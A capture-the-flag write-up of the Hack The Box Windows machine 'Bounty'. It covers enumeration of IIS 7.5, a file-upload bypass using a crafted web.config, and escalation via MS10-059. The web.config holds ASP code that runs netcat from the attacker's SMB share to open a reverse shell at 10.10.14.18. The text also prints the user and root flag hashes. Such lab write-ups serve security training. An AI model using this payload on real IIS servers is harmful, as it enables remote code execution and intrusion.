# Bounty
>Author : Xyan1d3
>Date : 10th July 2021
>IP : 10.10.10.93
>OS : Windows
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Sat Jul 10 01:23:12 2021 as: nmap -sC -sV -v -oN nmap/bounty 10.10.10.93
Nmap scan report for 10.10.10.93
Host is up (0.078s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see that the box is running `IIS 7.5` which can help us find out the windows version running.
`IIS 7.5` is used mainly by `Windows Server 2008`.

## Gobuster
```python
/transfer.aspx        (Status: 200) [Size: 941]
/uploadedfiles/       (Status: 403) [Size: 1233]
```

## Initial FootHold
We visit the `transfer.aspx` and find out a page for uploading files which we try to upload `asp` and `aspx` reverse shells.
But, It turns out it is not allowed.
So, I tried to use an `web.config` file which is like an `ASP.NET` configuration.

Exploit : https://gist.githubusercontent.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c/raw/8173f5041c9a69cc58e980717ebe044f8eff9e9f/shell%2520command%2520web.config

I make a `www` directory and hosted an smb share with `nc64.exe` in it with `smbserver.py` and make that `web.config` to connect to my share and execute the `nc64.exe` and grant me a shell in the box.

My modified `Web.config` looks like this : 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
Set objShell = CreateObject("WScript.Shell")
objShell.Exec("\\10.10.14.18\magisk\nc64.exe -e cmd.exe 10.10.14.18 8888")
Response.write("<!-"&"-")
%>
-->
```

We then upload this `web.config` file and visit the `http://10.10.10.93/uploadedfiles/web.config` to get the command to execute and get us a shell on the box.
![[Pasted image 20210710021656.png]]

## Getting the user Flag
The `user.txt` was a hidden file which can be revealed with a `dir /ah`.
```python
c:\Users\merlin\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0

 Directory of c:\Users\merlin\Desktop

05/31/2018  12:17 AM    <DIR>          .
05/31/2018  12:17 AM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  11,786,936,320 bytes free

c:\Users\merlin\Desktop>dir /ah
dir /ah
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0

 Directory of c:\Users\merlin\Desktop

05/30/2018  12:22 AM               282 desktop.ini
05/30/2018  11:32 PM                32 user.txt
               2 File(s)            314 bytes
               0 Dir(s)  11,786,936,320 bytes free

c:\Users\merlin\Desktop>type user.txt
type user.txt
e29ad89891462e0b09741e3082f44a2f
```
# Root Escalation
The System we are up against is an `Windows Server 2008 R2` unpatched.
So, The best exploit which comes to my mind is `MS10-059` or `Chimichurri`.

![[Pasted image 20210710022716.png]]

## Getting the root Flag
```python
c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0

 Directory of c:\Users\Administrator\Desktop

05/31/2018  12:18 AM    <DIR>          .
05/31/2018  12:18 AM    <DIR>          ..
05/31/2018  12:18 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  11,786,936,320 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
c837f7b699feef5475a0c079f9d4f5ea
```